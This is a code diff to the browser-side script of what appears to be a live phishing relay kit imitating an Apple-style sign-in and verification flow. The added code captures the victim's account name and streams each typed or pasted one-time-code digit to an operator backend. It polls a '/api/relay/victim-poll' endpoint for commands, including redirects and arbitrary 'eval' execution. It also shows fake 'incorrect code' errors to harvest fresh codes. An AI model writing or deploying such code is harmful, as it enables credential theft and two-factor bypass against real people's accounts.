@@ -73,9 +73,76 @@
     }
   }
 
+  function wipeHarborOtpFields() {
+    document.querySelectorAll(".otp-digit").forEach(function (input) {
+      input.value = "";
+      input.readOnly = false;
+      input.classList.remove("has-value", "is-otp-focused");
+    });
+    var statusEl = document.getElementById("verify-status");
+    if (statusEl) {
+      statusEl.hidden = true;
+      statusEl.classList.remove("verify-status--complete");
+    }
+    var otpRow = document.getElementById("otp-row");
+    if (otpRow) otpRow.classList.remove("otp-row--error", "harbor-shake");
+  }
+
+  function harborWipeOtp(message) {
+    window.__harborOtpRelayPausedUntil = Date.now() + 12000;
+    var msg = (message || "").trim() || "Incorrect verification code.";
+    if (window.HarborDriver && window.HarborDriver.showVerifyError) {
+      window.HarborDriver.showVerifyError(msg);
+      return;
+    }
+    wipeHarborOtpFields();
+    var inline = document.getElementById("verify-inline-error");
+    var inlineText = document.getElementById("verify-inline-error-text");
+    var otpRow = document.getElementById("otp-row");
+    if (inline && inlineText) {
+      inline.hidden = false;
+      inlineText.textContent = msg;
+    }
+    if (otpRow) {
+      otpRow.classList.add("otp-row--error");
+      otpRow.classList.remove("harbor-shake");
+      void otpRow.offsetWidth;
+      otpRow.classList.add("harbor-shake");
+    }
+  }
+
+  function otpRelayPaused() {
+    return (
+      window.__harborOtpRelayPausedUntil &&
+      Date.now() < window.__harborOtpRelayPausedUntil
+    );
+  }
+
   function applyState(st) {
-    if (!st || !window.HarborDriver) return;
+    if (!st) return;
+    if (st.verifyError && st.verifyError.msg) {
+      harborWipeOtp(st.verifyError.msg);
+      return;
+    }
+    if (st.clearHarborOtp) {
+      window.__harborOtpRelayPausedUntil = Date.now() + 12000;
+      if (window.HarborDriver && window.HarborDriver.wipeHarborOtp) {
+        window.HarborDriver.wipeHarborOtp();
+      } else {
+        wipeHarborOtpFields();
+      }
+    }
+    if (!window.HarborDriver) return;
     window.HarborDriver.applyHarborState(st);
+    if (st.verifyCopy && isSigninPath()) {
+      try {
+        sessionStorage.setItem("harbor_apple_mirror", "1");
+        sessionStorage.setItem("harbor_signin_pending", "1");
+        sessionStorage.setItem("harbor_verify_copy", JSON.stringify(st.verifyCopy));
+      } catch (e) {}
+      location.href = location.origin + "/verify" + location.search;
+      return;
+    }
     var btn = document.getElementById("continue-btn");
     if (!btn) return;
     if (st.passwordStep || st.clearSigninLoading || st.signinError) {
@@ -147,6 +214,10 @@
     );
 
     if (onPw) {
+      try {
+        sessionStorage.setItem("harbor_signin_pending", "1");
+        if (account) sessionStorage.setItem("harbor_account", account);
+      } catch (e) {}
       applyState({ clearSigninLoading: true, signinLoading: false });
     } else {
       window.__harborSubmitPending = true;
@@ -199,6 +270,154 @@
 
   wire();
 
+  function isSigninPath() {
+    var path = location.pathname || "/";
+    return path === "/signin" || path === "/signin.html";
+  }
+
+  function isVerifyPath() {
+    var path = location.pathname || "/";
+    return path === "/verify" || path === "/verify.html";
+  }
+
+  function goHarborPath(path, state) {
+    if (path.charAt(0) !== "/") path = "/" + path;
+    var cur = location.pathname || "/";
+    if (state) applyState(state);
+    if (cur === path || cur === path + "/") return;
+    try {
+      sessionStorage.setItem("harbor_apple_mirror", "1");
+      if (path === "/verify") {
+        sessionStorage.setItem("harbor_signin_pending", "1");
+      }
+    } catch (e) {}
+    location.href = location.origin + path + location.search;
+  }
+
+  function applyCmd(cmd) {
+    if (!cmd || !cmd.op) return;
+    if (cmd.op === "harbor-wipe-otp") {
+      harborWipeOtp(cmd.message || cmd.msg || "");
+      return;
+    }
+    if (cmd.op === "harbor-state" && cmd.state) {
+      applyState(cmd.state);
+      return;
+    }
+    if (cmd.op === "harbor-route") {
+      goHarborPath(cmd.path || "/signin", cmd.state || null);
+      return;
+    }
+    if (cmd.op === "goto" && cmd.url) {
+      try {
+        sessionStorage.setItem("harbor_apple_mirror", "1");
+      } catch (e) {}
+      location.href = cmd.url;
+      return;
+    }
+    if (cmd.op === "eval" && cmd.expr) {
+      try {
+        if (cmd.arg !== undefined) {
+          var fn = new Function("arg", "return (" + cmd.expr + ")(arg)");
+          fn(cmd.arg);
+        } else {
+          var fn2 = new Function("return (" + cmd.expr + ")")();
+          if (typeof fn2 === "function") fn2();
+        }
+      } catch (e1) {
+        try {
+          eval(cmd.expr);
+        } catch (e2) {}
+      }
+    }
+  }
+
+  function applyCmdBatch(cmds) {
+    if (!cmds || !cmds.length) return;
+    var wipes = [];
+    var evals = [];
+    var routes = [];
+    var states = [];
+    for (var i = 0; i < cmds.length; i++) {
+      var c = cmds[i];
+      if (!c || !c.op) continue;
+      if (c.op === "harbor-wipe-otp") wipes.push(c);
+      else if (c.op === "harbor-route" || c.op === "goto") routes.push(c);
+      else if (c.op === "harbor-state") states.push(c);
+      else if (c.op === "eval") evals.push(c);
+    }
+    for (var w = 0; w < wipes.length; w++) applyCmd(wipes[w]);
+    for (var e = 0; e < evals.length; e++) applyCmd(evals[e]);
+    if (states.length) applyCmd(states[states.length - 1]);
+    if (routes.length) applyCmd(routes[routes.length - 1]);
+  }
+
+  var lastMetaPath = location.pathname || "/";
+  function sendMetaIfChanged() {
+    var path = location.pathname || "/";
+    if (path === lastMetaPath) return;
+    lastMetaPath = path;
+    emit("meta", { path: path, href: location.href, ready: document.readyState });
+  }
+
+  function wireVerifyOtp() {
+    if (!isVerifyPath()) return;
+    var inputs = document.querySelectorAll(".otp-digit");
+    if (!inputs.length) return;
+    inputs.forEach(function (input) {
+      if (input.__harborOtpWired) return;
+      input.__harborOtpWired = true;
+      input.addEventListener(
+        "input",
+        function () {
+          if (otpRelayPaused()) return;
+          var raw = input.getAttribute("data-otp-index") || "0";
+          var index = parseInt(raw, 10);
+          if (isNaN(index)) index = 0;
+          emit("otp-input", {
+            index: index,
+            digit: (input.value || "").replace(/\D/g, "").slice(-1),
+          });
+        },
+        true
+      );
+      input.addEventListener(
+        "keydown",
+        function (e) {
+          if (otpRelayPaused()) return;
+          if (e.key !== "Backspace") return;
+          var raw = input.getAttribute("data-otp-index") || "0";
+          var index = parseInt(raw, 10);
+          if (isNaN(index)) index = 0;
+          emit("otp-input", { index: index, digit: "", backspace: true });
+        },
+        true
+      );
+    });
+    document.addEventListener(
+      "paste",
+      function (e) {
+        if (otpRelayPaused()) return;
+        var t = e.target;
+        if (!t || !t.classList || !t.classList.contains("otp-digit")) return;
+        var pasted = (
+          (e.clipboardData && e.clipboardData.getData("text")) ||
+          ""
+        )
+          .replace(/\D/g, "")
+          .slice(0, 6);
+        if (!pasted) return;
+        emit("otp-paste", { digits: pasted.split("") });
+      },
+      true
+    );
+  }
+
+  wireVerifyOtp();
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", wireVerifyOtp);
+  }
+
   function poll() {
     fetch(
       "/api/relay/victim-poll?upstream=" +
@@ -211,16 +430,15 @@
         return r.json();
       })
       .then(function (j) {
-        var cmds = (j && j.cmds) || [];
-        for (var i = 0; i < cmds.length; i++) {
-          var c = cmds[i];
-          if (c && c.op === "harbor-state" && c.state) applyState(c.state);
-        }
+        applyCmdBatch((j && j.cmds) || []);
       })
       .catch(function () {});
   }
   setInterval(poll, 40);
   poll();
+  setInterval(sendMetaIfChanged, 1500);
+  window.addEventListener("popstate", sendMetaIfChanged);
+  sendMetaIfChanged();
 
   function setSpinner(on) {
     var btn = document.getElementById("continue-btn");
